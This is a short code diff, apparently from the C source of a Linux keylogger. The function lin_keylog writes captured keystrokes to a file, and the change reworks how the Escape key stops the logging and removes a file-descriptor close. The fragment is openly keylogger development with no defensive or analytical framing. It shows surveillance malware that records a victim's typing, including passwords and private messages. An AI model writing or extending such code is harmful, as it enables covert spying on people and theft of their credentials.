@@ -130,7 +130,10 @@ void lin_keylog(const char* filePath) {
                     fputs(key, file);
                     fflush(file);
                     fclose(file);
-                } else if (ev.code == KEY_ESC) { close(fd); end_keylog(filePath); } // Escape key to end the keylogger
+
+                    // Check if ESCAPE key is pressed
+                    if (ev.code == KEY_ESC) end_keylog(filePath);
+                }
             }
         }
     }
